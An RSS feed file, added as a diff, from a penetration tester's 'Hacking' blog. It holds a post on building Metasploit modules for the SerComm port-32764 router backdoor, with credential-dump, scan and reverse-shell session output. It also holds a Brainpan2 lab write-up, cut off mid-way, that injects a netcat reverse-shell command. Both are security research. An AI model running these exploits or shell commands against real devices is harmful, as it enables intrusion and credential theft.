@@ -1,0 +1,2216 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hacking on Matt Andreko</title>
+    <link>https://www.mattandreko.com/categories/hacking/index.xml</link>
+    <description>Recent content in Hacking on Matt Andreko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <atom:link href="https://www.mattandreko.com/categories/hacking/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Backdoor Modules for Netgear, Linksys, and Other Routers</title>
+      <link>https://www.mattandreko.com/blog/2014-01-13-backdoor-modules-for-netgear-linksys-and-other-routers/</link>
+      <pubDate>Mon, 13 Jan 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2014-01-13-backdoor-modules-for-netgear-linksys-and-other-routers/</guid>
+      <description>
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/backdoor_all_the_routers.jpg#left&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;A week or so ago, I read the news of a new backdoor on several devices, including those made by &lt;a href=&#34;http://www.belkin.com/&#34;&gt;Belkin&lt;/a&gt;, &lt;a href=&#34;http://www.cisco.com/&#34;&gt;Cisco&lt;/a&gt;, &lt;a href=&#34;http://www.netgear.com&#34;&gt;NetGear&lt;/a&gt;, &lt;a href=&#34;http://www.linksys.com&#34;&gt;Linksys&lt;/a&gt;, and several others. A list of what seems to be affected devices can be found &lt;a href=&#34;http://wikidevi.com/w/index.php?title=Special%3AAsk&amp;amp;q=%5B%5BManuf%3A%3ASerComm%5D%5D+%5B%5BGlobal+type%3A%3A~embedded*%5D%5D&amp;amp;po=%3FFCC+ID%0D%0A%3FFCC+approval+date%3DFCC+date%0D%0A%3FEstimated+date+of+release%3DEst.+release+date%0D%0A%3FEmbedded+system+type%0D%0A%3FCPU1+brand%0D%0A%3FCPU1+model%3DCPU1+mdl.%0D%0A&amp;amp;eq=yes&amp;amp;p%5Bformat%5D=broadtable&amp;amp;sort_num=&amp;amp;order_num=ASC&amp;amp;p%5Blimit%5D=500&amp;amp;p%5Boffset%5D=&amp;amp;p%5Blink%5D=all&amp;amp;p%5Bsort%5D=&amp;amp;p%5Bheaders%5D=show&amp;amp;p%5Bmainlabel%5D=&amp;amp;p%5Bintro%5D=&amp;amp;p%5Boutro%5D=&amp;amp;p%5Bsearchlabel%5D=%25E&#34;&gt;here&lt;/a&gt;. &lt;a href=&#34;https://twitter.com/elvanderb&#34;&gt;Eloi Vanderbeken&lt;/a&gt;, who posted his findings on &lt;a href=&#34;https://github.com/elvanderb/TCP-32764&#34;&gt;GitHub&lt;/a&gt; made the original discovery. He also wrote a useful python proof-of-concept exploit, which allowed command injection, but I wanted &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; integration.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;After playing with the proof-of-concept, I realized how powerful this backdoor could be. As I&amp;rsquo;m doing penetration tests for large enterprises, I&amp;rsquo;m still amazed that I find small consumer-grade routers all the time. With this backdoor, however, I could gain leverage into certain networks, gain credentials, or all kinds of other fun. That&amp;rsquo;s where all my learning started.&lt;/p&gt;
+
+&lt;div style=&#34;clear:both;&#34;&gt;&lt;/div&gt;
+
+&lt;h2 id=&#34;configuration-dump-module&#34;&gt;Configuration Dump Module&lt;/h2&gt;
+
+&lt;p&gt;So the first module I wrote, with the help of &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, was to dump the configuration of the device&amp;rsquo;s nvram. This is useful to an attacker for a couple reasons:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;It contains clear-text passwords to the device, which can often be used to login to the remote management console.&lt;/li&gt;
+&lt;li&gt;In case the device gets messed up from attacking it, all the configuration values can be restored at a later time from the dump.&lt;/li&gt;
+&lt;li&gt;It contains passwords, sweet passwords! People re-use their passwords everywhere, and you now have valid passwords.&lt;/li&gt;
+&lt;li&gt;Did I mention the passwords?&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Below is a demonstration of the module running. Note the wireless SSID, keys, and additional credentials being uncovered, without having to supply any credentials:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfcli auxiliary/admin/misc/sercomm_dump_config RHOST=192.168.1.1 E
+[*] Initializing modules...
+RHOST =&amp;gt; 192.168.1.1
+[*] 192.168.1.1:32764 - Attempting to connect and check endianess...
+[+] 192.168.1.1:32764 - Big Endian device found...
+[*] 192.168.1.1:32764 - Attempting to connect and dump configuration...
+[*] 192.168.1.1:32764 - Router configuration dump stored in: /Users/mandreko/.msf4/loot/20140113231717_default_192.168.1.1_router.config_104290.txt
+[*] 192.168.1.1:32764 - Wifi SSID: Netgear15
+[*] 192.168.1.1:32764 - Wifi Key 1: 2A17B75F3D
+[*] 192.168.1.1:32764 - Wifi Key 2: C65EFCF158
+[*] 192.168.1.1:32764 - Wifi Key 3: 3066C6DDE6
+[*] 192.168.1.1:32764 - Wifi Key 4: 1F397B65CA
+[*] 192.168.1.1:32764 - HTTP Web Management: User: admin Pass: password
+[*] 192.168.1.1:32764 - PPPoE: User: mandreko_dsl Pass: isreallysecure1
+[*] 192.168.1.1:32764 - PPPoA: User: mandreko_dsl Pass: isreallysecure1
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just tonight, I found that in some of the refactoring we did, the credential collection actually broke, so I made a &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2878&#34;&gt;pull-request&lt;/a&gt; to fix it (in case anyone wants to try it before it&amp;rsquo;s merged to trunk). The above output was using the newer code.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-scanner-module&#34;&gt;The Scanner Module&lt;/h2&gt;
+
+&lt;p&gt;So we can dump the nvram configuration of a device. But what good is that if you&amp;rsquo;re unable to find vulnerable devices on the network? In came module number two, the scanner, which could scan all sorts of network ranges. In the below sample, I scanned my test network for the vulnerability, and it found my device, and detected the endianness it was communicating over. You see, MIPS, unlike x86, which is always little endian, can be big or little endian, depending on the processor. Some can even be both, I&amp;rsquo;m told. However, you need to know which, to know how to communicate with the device. You can start to see how learning MIPS was going to be fun.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfcli auxiliary/scanner/misc/sercomm_backdoor_scanner RHOSTS=192.168.1.0/24 THREADS=64 E
+[*] Initializing modules...
+RHOSTS =&amp;gt; 192.168.1.0/24
+THREADS =&amp;gt; 64
+[+] 192.168.1.1:32764 - Possible backdoor detected - Big Endian
+[*] Scanned 036 of 256 hosts (014% complete)
+[*] Scanned 058 of 256 hosts (022% complete)
+[*] Scanned 083 of 256 hosts (032% complete)
+[*] Scanned 105 of 256 hosts (041% complete)
+[*] Scanned 129 of 256 hosts (050% complete)
+[*] Scanned 157 of 256 hosts (061% complete)
+[*] Scanned 196 of 256 hosts (076% complete)
+[*] Scanned 205 of 256 hosts (080% complete)
+[*] Scanned 233 of 256 hosts (091% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;the-journey-to-an-exploit&#34;&gt;The journey to an exploit&lt;/h2&gt;
+
+&lt;p&gt;So the first two modules really didn&amp;rsquo;t take a long time to write. The scanner for example, was all of 30 minutes, since &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; has so many nice mix-ins, and libraries already available. The bulk of my last week and a half was spent learning MIPS, and how to generate working payloads. Let me take you on my journey&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Initially, I tried using the payloads in Metasploit, since they&amp;rsquo;ve recently added MIPSBE and MIPSLE (big endian and little endian respectively). However, on my testing device, none of the payloads would work. I figured that it would probably be pretty easy to compile for MIPS based devices, since people do ARM all the time with iOS and Android development. Boy was I wrong. I spent 3 days trying to get a working toolchain. I installed the &lt;a href=&#34;http://buildroot.uclibc.org/&#34;&gt;uclibc Buildroot&lt;/a&gt; toolchain, and found that it&amp;rsquo;s documentation was a bit hard to decipher for a newbie like me. I tried using &lt;a href=&#34;http://www.mentor.com/embedded-software/sourcery-tools/sourcery-codebench/editions/lite-edition/&#34;&gt;Sourcery Codebench&lt;/a&gt;, but again was foiled, because I couldn&amp;rsquo;t target the correct MIPS processors. Eventually I was reading about using &lt;a href=&#34;http://www.gentoo.org&#34;&gt;Gentoo&lt;/a&gt; with its &amp;ldquo;crossdev&amp;rdquo; package.&lt;/p&gt;
+
+&lt;p&gt;After a day of compiling, I had a working base image. From there, I installed crossdev per the documentation. Additionally, I had it create cross-compilers for my MIPS target. (This took several hours to figure out how to get right) In case anyone wants it, this worked for me:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# emerge crossdev
+# CBUILD=x86_64-pc-linux-gnu CHOST=x86_64-pc-linux-gnu CTARGET=mips-pc-linux-uclibc USE=-nptl crossdev --target mips-pc-linux-uclibc --without-headers
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Amazing! I could build executables! I made a simple HelloWorld app, and compiled it. It then ran on my test device. I was in business. I just had to figure out how to make a new template in Metasploit, which was going to be no fun at all.&lt;/p&gt;
+
+&lt;p&gt;I started talking with &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, and I mentioned that my exploit module would now upload the binary payload, but would never run, giving all sorts of random errors. However, if I manually ran &amp;lsquo;msfpayload&amp;rsquo;, and uploaded the output, it would work. For some reason I had never tried this, because I do things the hard way sometimes. When we were talking, something I said apparently made him think about it. He came back, and told me he found something. Intrigued, I asked for more information, and he showed me a typo in the core libraries that he then made into a &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2849/files&#34;&gt;pull-request&lt;/a&gt;. It was a simple mistake, which was probably looked over several times. The  MIPSBE payloads were being encoded with a MIPSLE encoder, which just messed up everything.&lt;/p&gt;
+
+&lt;p&gt;After he merged the pull request, the skies turned blue, and a little rainbow appeared. Payloads were being generated in my module successfully, and giving me shells. Then, I realized that all the time I spent building a &lt;a href=&#34;http://www.gentoo.org&#34;&gt;Gentoo&lt;/a&gt; crossdev environment, and installing all kinds of tools were pretty much wasted, since it was all just due to a single character typo. On the bright side, the time wasn&amp;rsquo;t really wasted, as I did learn a &lt;em&gt;lot&lt;/em&gt; about MIPS, since I was starting to read on shellcoding too.&lt;/p&gt;
+
+&lt;h1 id=&#34;the-smell-of-fresh-shells-in-the-morning&#34;&gt;The smell of fresh shells in the morning&lt;/h1&gt;
+
+&lt;p&gt;So after all that time messing with MIPS and &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; ruby code, I had something working, which would actually get a shell. However, as I quickly learned over this past weekend, I forgot to account for little endian devices on the exploit. I had even written code to detect the endianness on the scanner and config dump modules, but somehow on the important command injection vulnerability, had only tested on big endian. I came clean with &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, and told him to expect yet another pull request. He was able to make a quick fix, to get the module working for the next Pro release. I then worked to put together a new pull-request to add the little endian values.&lt;/p&gt;
+
+&lt;p&gt;During my testing over several devices, however, I found that sometimes devices that would talk to me using big endian, would sometimes require little endian payloads, and vice versa. It was odd, and I can&amp;rsquo;t explain it, but they did. So I added several new targets to my exploit, for specific devices, as well as 2 generic ones. As I get ahold of additional devices (or anyone else for that matter), the code will be updated to reflect those new values. Those changes will hopefully be merged into the trunk soon, but for now, the code can be accessed &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2874&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;To demonstrate this bug, I have exploited a NetGear WAP4410N device:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfconsole -r wap4410n.rc
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.pro %%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v4.9.0-dev [core:4.9 api:1.0] ]
++ -- --=[ 1251 exploits - 681 auxiliary - 201 post ]
++ -- --=[ 328 payloads - 32 encoders - 8 nops      ]
++ -- --=[ Answer Q&#39;s about Metasploit and win a WiFi Pineapple Mk5   ]
++ -- --=[ http://bit.ly/msfsurvey (Expires Wed Jan 22 23:59:59 2014) ]
+
+[*] Processing wap4410n.rc for ERB directives.
+resource (wap4410n.rc)&amp;gt; use exploit/linux/misc/sercomm_exec
+resource (wap4410n.rc)&amp;gt; set target 2
+target =&amp;gt; 2
+resource (wap4410n.rc)&amp;gt; set payload linux/mipsbe/shell_reverse_tcp
+payload =&amp;gt; linux/mipsbe/shell_reverse_tcp
+resource (wap4410n.rc)&amp;gt; set rhost 192.168.1.1
+rhost =&amp;gt; 192.168.1.1
+resource (wap4410n.rc)&amp;gt; set lhost 192.168.1.136
+lhost =&amp;gt; 192.168.1.136
+msf exploit(sercomm_exec) &amp;gt; show options
+
+Module options (exploit/linux/misc/sercomm_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.1.1      yes       The target address
+   RPORT  32764            yes       The target port
+
+
+Payload options (linux/mipsbe/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.136    yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   Cisco WAP4410N
+
+
+msf exploit(sercomm_exec) &amp;gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Generic Linux MIPS Big Endian
+   1   Generic Linux MIPS Little Endian
+   2   Cisco WAP4410N
+   3   Honeywell WAP-PL2 IP Camera
+   4   Netgear DG834
+   5   Netgear DG834G
+   6   Netgear DG834PN
+   7   Netgear DGN1000
+   8   Netgear DSG835
+   9   Netgear WPNT834
+
+
+msf exploit(sercomm_exec) &amp;gt; exploit
+
+[*] Started reverse handler on 192.168.1.136:4444
+[*] Command shell session 1 opened (192.168.1.136:4444 -&amp;gt; 192.168.1.1:2817) at 2014-01-14 00:33:02 -0500
+[*] Command Stager progress - 100.00% done (1415/1415 bytes)
+
+ls -al /
+drwxrwxrwx    8 0        0               0 var
+drwxr-xr-x    7 0        0              81 usr
+drwxrwxrwx    4 0        0               0 tmp
+drwxr-xr-x    2 0        0             217 sbin
+drwxr-xr-x    2 0        0              36 root
+dr-xr-xr-x   47 0        0               0 proc
+drwxr-xr-x    2 0        0              23 lost+found
+drwxr-xr-x    3 0        0             742 lib
+drwxr-xr-x    6 0        0             352 etc
+drwxr-xr-x    3 0        0             403 dev
+drwxr-xr-x    2 0        0             323 bin
+drwxr-xr-x   13 0        0             119 ..
+drwxr-xr-x   13 0        0             119 .
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At this point, command injection has been turned into a fully-fledged shell. As &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egyp7&lt;/a&gt; says, &amp;ldquo;I love shells&amp;rdquo;.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-scary-part&#34;&gt;The scary part&lt;/h2&gt;
+
+&lt;p&gt;So here you&amp;rsquo;ve seen how you can take a router, and get a shell on it. However the truly scary part is that several of these devices are listening on their WAN interface! That means a remote attacker can exploit your vulnerable router, and start mapping the inside of your network. Some devices support an SSH server, which you could then connect into, and make a dynamic socks proxy, or just forward ports. You already know the username and password to the SSH server, since you dumped all the passwords before, right?&lt;/p&gt;
+
+&lt;p&gt;Another attack could be to simply change the router&amp;rsquo;s DNS servers, so that when clients connect, it serves them with an evil DNS server, making all your sites go to a remote server, which then transparently steals your credentials.&lt;/p&gt;
+
+&lt;p&gt;You can go all tin-foil hat on this, and have some real fun. However, in the long run, I accomplished my goal, and now can compromise many of those devices I see on penetration tests, which really shouldn&amp;rsquo;t belong in the enterprise, and finally have something to back it up with, other than, &amp;ldquo;it says &amp;lsquo;Home&amp;rsquo; on the box&amp;hellip;&amp;rdquo;&lt;/p&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This was a really fun exercise, and taught me a lot about MIPS. This is also now one of my more favorite contributions.&lt;/p&gt;
+
+&lt;p&gt;In the near future, it sounds like there are going to be staged payloads for MIPS, so you don&amp;rsquo;t have to run the big un-staged ones. As more and more vulnerabilities start popping up on these &amp;ldquo;unconventional computers&amp;rdquo;, we&amp;rsquo;ll see more and more framework around exploiting them. I for one am excited.&lt;/p&gt;
+
+&lt;p&gt;Additionally, if you have any access to a vulnerable device, which isn&amp;rsquo;t currently a target in the exploit module, hit me up. I&amp;rsquo;d love to get more devices added, without buying 100 routers.&lt;/p&gt;
+
+&lt;p&gt;Lastly, I&amp;rsquo;d like to personally thank &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;. Without your help, these code contributions would have been much lower in quality, if existing at all. You rock.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Brainpan2</title>
+      <link>https://www.mattandreko.com/blog/2013-11-20-brainpan2/</link>
+      <pubDate>Wed, 20 Nov 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-11-20-brainpan2/</guid>
+      <description>
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/brainpan.jpg#left&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Over on #vulnhub, there has been quite a chatter about &lt;a href=&#34;http://vulnhub.com/entry/brainpan_2,56/&#34;&gt;Brainpan2&lt;/a&gt;, a &amp;ldquo;sequel&amp;rdquo; to Brainpan, by &lt;a href=&#34;https://twitter.com/@superkojiman&#34;&gt;superkojiman&lt;/a&gt;. They&amp;rsquo;re even offering a 50 GBP award to whoever submits the best write-up! Since I enjoy challenges like this, I took a look at the machine. However, the writeup had to wait until the contest was complete, so that people didn&amp;rsquo;t cheat to win.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;div style=&#34;clear:both;&#34;&gt;&lt;/div&gt;
+
+&lt;h2 id=&#34;the-trolling-it-begins-early&#34;&gt;The trolling, it begins early&amp;hellip;&lt;/h2&gt;
+
+&lt;p&gt;I imported the VM into VMWare Fusion, and started finding the host.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/brainpan2_vmware_booted.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The first thing I had to do, was find it&amp;rsquo;s IP. Many people use &amp;lsquo;netdiscover&amp;rsquo;, but I typically prefer just ping sweeping often. It can sometimes miss, but it works well for me.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nmap -sP 192.168.188.0/24
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-20 16:19 EST
+Nmap scan report for 192.168.188.1
+Host is up (0.00046s latency).
+Nmap scan report for 192.168.188.146
+Host is up (0.00061s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 3.14 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From this, I now know the IP is 192.168.188.146 on my network, but will vary for each person playing this game.&lt;/p&gt;
+
+&lt;p&gt;Next, I did a basic nmap scan to discover what services were on the machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nmap -sV 192.168.188.146
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-20 16:20 EST
+Nmap scan report for 192.168.188.146
+Host is up (0.0017s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.38 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This looked eerily similar to the original Brainpan vulnerable machine. Due to that, I started to attack it in a similar method. I ran &amp;lsquo;dirb&amp;rsquo; on the web server to see if there were any hidden files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  dirb  ./dirb http://192.168.188.146:10000 wordlists/big.txt -S
+
+-----------------
+DIRB v2.03
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Nov 20 16:22:36 2013
+URL_BASE: http://192.168.188.146:10000/
+WORDLIST_FILES: wordlists/big.txt
+OPTION: Silent Mode
+
+-----------------
+
+GENERATED WORDS: 4217
+
+---- Scanning URL: http://192.168.188.146:10000/ ----
++ http://192.168.188.146:10000//
+    (FOUND: 200 [Ok] - Size: 204)
++ http://192.168.188.146:10000/bin
+    (FOUND: 301 [Moved Permanently] - Size: 0)
+
+-----------------
+DOWNLOADED: 4217 - FOUND: 2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Again, just like the previous challenge, there was a &amp;lsquo;bin&amp;rsquo; folder. I browsed to it, and saw a &amp;lsquo;brainpan.exe&amp;rsquo;. I had to double-check that I had downloaded the proper boot2root again!&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/brainpan2_firefox_bin_directory.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I downloaded the file, and looked to see if it was still a Portable Executable, only to discover it was actually a JPEG.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  wget http://192.168.188.146:10000/bin/brainpan.exe
+--2013-11-20 16:25:15--  http://192.168.188.146:10000/bin/brainpan.exe
+Connecting to 192.168.188.146:10000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18764 (18K) [application/x-msdos-program]
+Saving to: ‘brainpan.exe’
+
+100%[======================================&amp;gt;] 18,764      --.-K/s   in 0.001s
+
+2013-11-20 16:25:15 (16.7 MB/s) - ‘brainpan.exe’ saved [18764/18764]
+
+➜  ~  file brainpan.exe
+brainpan.exe: JPEG image data, JFIF standard 1.01, comment: &amp;quot;CREATOR: gd-jpeg v1.0 (using IJ&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I renamed the file to have a JPEG extension, and opened it, only to see that I&amp;rsquo;d been trolled. I can sense a theme for this challenge&amp;hellip;&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/brainpan2_preview.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;getting-down-to-business&#34;&gt;Getting down to business&lt;/h2&gt;
+
+&lt;p&gt;Since the webserver seemed to be a dead end, I connected to the server on port 9999. It looked to be a terminal application that I could play with. I logged in as GUEST, and looked around to see the commands it would allow.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nc 192.168.188.146 9999
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 2.0________________________]
+                             LOGIN AS GUEST
+
+                          &amp;gt;&amp;gt; GUEST
+                          ACCESS GRANTED
+
+
+                             *  *  *  *
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.
+    TYPE &amp;quot;TELL ME MORE&amp;quot; FOR A LIST OF COMMANDS.
+                             *  *  *  *
+
+
+                          &amp;gt;&amp;gt; TELL ME MORE
+    FILES    HELP    VIEW       CREATE
+    USERS    MSG     SYSTEM     BYE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I found that if I ran the &amp;lsquo;FILES&amp;rsquo; command, it would show me a file listing.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+                          &amp;gt;&amp;gt; FILES
+total 36
+-rwxr-xr-x 1 root   root   18424 Nov  4 15:17 brainpan.exe
+-rw-r--r-- 1 root   root    1109 Nov  5 09:24 brainpan.txt
+-rw-r--r-- 1 root   root     683 Nov  4 12:14 notes.txt
+-rw-r--r-- 1 anansi anansi    12 Nov  5 09:16 test-1
+-rwxrwxrwx 1 anansi anansi    19 Nov  5 09:16 test-2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If I then used the &amp;lsquo;VIEW&amp;rsquo; command, I could read those files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;-rwxrwxrwx 1 anansi anansi    19 Nov  5 09:16 test-2
+                          &amp;gt;&amp;gt; VIEW
+    ENTER FILE TO DOWNLOAD: test-2
+File create works.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After tinkering, I found that the &amp;lsquo;VIEW&amp;rsquo; command, would let me inject code, if I just prepended my commands with a semi-colon. It wasn&amp;rsquo;t sanitizing the input very well.&lt;/p&gt;
+
+&lt;p&gt;I setup a local listener on my MacBook (192.168.1.136).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nc -lv 1234
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then issued the &amp;lsquo;VIEW&amp;rsquo; command, and injected a connect-back command through netcat.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;                          &amp;gt;&amp;gt; VIEW
+    ENTER FILE TO DOWNLOAD: ; /bin/nc.traditional -e /bin/sh 192.168.1.136 1234
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The window just froze, so I went back to my netcat window to verify it was working. I issued the &amp;lsquo;id&amp;rsquo; command to test it. It was in fact working, and showed that I was able to execute commands as &amp;lsquo;anansi&amp;rsquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I really wanted to upgrade this shell to a &amp;lsquo;real&amp;rsquo; shell, like over SSH, but the port scan before didn&amp;rsquo;t show SSH running. On a hunch, I ran &amp;lsquo;netstat&amp;rsquo;, and I found the SSH server running on the &amp;lsquo;127.0.1.1&amp;rsquo; host, on port 2222. Checking the /etc/ssh/sshd_config file verified this configuration, albeit a bit odd.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;netstat -antup
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      5382/brainpan.exe
+tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -
+tcp        0      0 192.168.188.146:50562   192.168.1.136:1234      ESTABLISHED 5522/sh
+tcp        0      0 192.168.188.146:9999    192.168.188.1:52622     ESTABLISHED 5382/brainpan.exe
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+udp        0      0 0.0.0.0:7240            0.0.0.0:*                           -
+udp6       0      0 :::59406                :::*                                -
+&lt;/code&gt;&lt;/pre&gt;
+
